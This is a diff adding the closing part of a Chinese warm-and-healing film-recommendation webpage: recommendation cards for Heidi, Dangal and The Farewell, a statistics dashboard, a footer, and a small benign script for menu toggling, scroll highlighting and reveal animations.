+      <div class="pitem flip"><div class="post" style="--a:#7a3b4e;--b:#542536;"><i>温情</i><span>海蒂</span></div><div class="pbody"><h3>阿尔卑斯山的风，吹走了所有不开心</h3><div class="why">— 为什么推荐</div><p>小女孩海蒂被送到阿尔卑斯山与爷爷同住，用最纯粹的善良融化了爷爷坚硬的心。画面美得像明信片，看完心里暖暖的，是全家都能一起看的好片。</p><div class="tags"><em>亲情</em><em>治愈</em><em>瑞士</em><em>经典</em></div></div></div>
+      <div class="pitem"><div class="post" style="--a:#ff7a5c;--b:#d94a30;"><i>励志</i><span>摔跤吧</span></div><div class="pbody"><h3>爸爸的梦想，也是女儿的翅膀</h3><div class="why">— 为什么推荐</div><p>一位父亲把两个女儿培养成摔跤冠军的故事，热血又动人。被生活打击时看这部，会被那种不服输的劲头重新点燃。</p><div class="tags"><em>励志</em><em>运动</em><em>亲情</em><em>印度</em></div></div></div>
+      <div class="pitem flip"><div class="post" style="--a:#ffcf70;--b:#e0a53a;"><i>家庭</i><span>别告诉她</span></div><div class="pbody"><h3>关于"家"，我们都有说不出口的爱</h3><div class="why">— 为什么推荐</div><p>奶奶患癌，家人决定不告诉她，一场横跨大洋的家庭聚会由此展开。笑中带泪，把中国家庭那种含蓄而深沉的爱拍得细腻入微。</p><div class="tags"><em>家庭</em><em>温情</em><em>华语</em><em>真实故事</em></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目六：数据看板 ===== -->
+<section class="band dash rv" id="dash">
+  <div class="wrap">
+    <div class="bd-top">
+      <div><span class="eyeb"><span class="bar"></span>红枣看板</span><h2 class="hd">一颗红枣的<em>小数据</em></h2><p class="ds">我们用心分享好片，也用数字记录陪伴</p></div>
+    </div>
+
+    <div class="dashgrid">
+      <div class="dc"><div class="l">精选好片</div><div class="v">3,200+</div><div class="d">持续更新中</div></div>
+      <div class="dc"><div class="l">细分类型</div><div class="v">28</div><div class="d">覆盖各种心情</div></div>
+      <div class="dc"><div class="l">编辑精选</div><div class="v">860</div><div class="d">每部都看过才推</div></div>
+      <div class="dc"><div class="l">影迷同好</div><div class="v">16万</div><div class="d">一起聊电影</div></div>
+    </div>
+
+    <div class="ringwrap">
+      <div class="ring"><div class="num">38%</div><div class="lb">治愈系 · 最受欢迎</div></div>
+      <div class="ring"><div class="num">26%</div><div class="lb">家庭亲情</div></div>
+      <div class="ring"><div class="num">18%</div><div class="lb">爱情浪漫</div></div>
+      <div class="ring"><div class="num">12%</div><div class="lb">青春成长</div></div>
+      <div class="ring"><div class="num">6%</div><div class="lb">其他类型</div></div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer class="foot">
+  <div class="fin">
+    <div class="flay">
+      <div>
+        <a href="#top" class="logo fb"><span class="zao">🍒</span><b><i>红枣</i>电影网</b><em>hongzaodianyingwang</em></a>
+        <p class="fabout">红枣电影网（hongzaodianyingwang-wap.github.io）是一个专注分享温暖、治愈、温情好片的电影平台，为每一个热爱生活的你甄选值得一看的佳片，让观影成为一件温暖的小事。</p>
+      </div>
+      <div class="fcol"><h5>网站导航</h5><ul>
+        <li><a href="#pick">今日甄选</a></li><li><a href="#cat">分类频道</a></li><li><a href="#mood">观影心情</a></li><li><a href="#week">每周推荐</a></li><li><a href="#plist">温暖片单</a></li>
+      </ul></div>
+      <div class="fcol"><h5>分类频道</h5><ul>
+        <li><a href="#">治愈系电影</a></li><li><a href="#">家庭亲情</a></li><li><a href="#">爱情浪漫</a></li><li><a href="#">轻松喜剧</a></li><li><a href="#">青春成长</a></li>
+      </ul></div>
+      <div class="fcol"><h5>关于红枣</h5><ul>
+        <li><a href="#">关于我们</a></li><li><a href="#">投稿合作</a></li><li><a href="#">片单征集</a></li><li><a href="#">观影指南</a></li><li><a href="#">联系我们</a></li>
+      </ul></div>
+    </div>
+    <div class="fbot">
+      <span>&copy; 2026 红枣电影网 hongzaodianyingwang-wap.github.io 版权所有</span>
+      <div><a href="#">免责声明</a> · <a href="#">内容规范</a> · <a href="#">联系我们</a> · <a href="#" class="u">hongzaodianyingwang-wap.github.io</a></div>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  'use strict';
+  var burg=document.getElementById('burg'),nav=document.getElementById('nav'),
+      links=nav.querySelectorAll('a'),secs=[].slice.call(document.querySelectorAll('main section[id]'));
+
+  burg.addEventListener('click',function(){
+    var open=nav.style.display==='flex';
+    nav.style.display=open?'':'flex';
+    if(!open){nav.style.flexDirection='column';nav.style.position='absolute';nav.style.top='100%';
+      nav.style.left='0';nav.style.right='0';nav.style.padding='22px';
+      nav.style.background='rgba(19,8,8,0.98)';nav.style.borderBottom='1px solid var(--line2)';}
+  });
+  links.forEach(function(a){a.addEventListener('click',function(){nav.style.display='';});});
+
+  function onScroll(){var y=window.pageYOffset;var cur='';
+    secs.forEach(function(s){if(y>=s.offsetTop-150)cur=s.id;});
+    links.forEach(function(a){a.classList.remove('on');if(a.getAttribute('href')==='#'+cur)a.classList.add('on');});}
+  window.addEventListener('scroll',onScroll,{passive:true});onScroll();
+
+  var rvs=[].slice.call(document.querySelectorAll('.rv'));
+  if('IntersectionObserver' in window){
+    var io=new IntersectionObserver(function(es){es.forEach(function(e){
+      if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target);}});},{threshold:0.08,rootMargin:'0px 0px -40px'});
+    rvs.forEach(function(el){io.observe(el);});
+  }else{rvs.forEach(function(el){el.classList.add('in');});}
+})();
+</script>
+
+</body>
+</html>
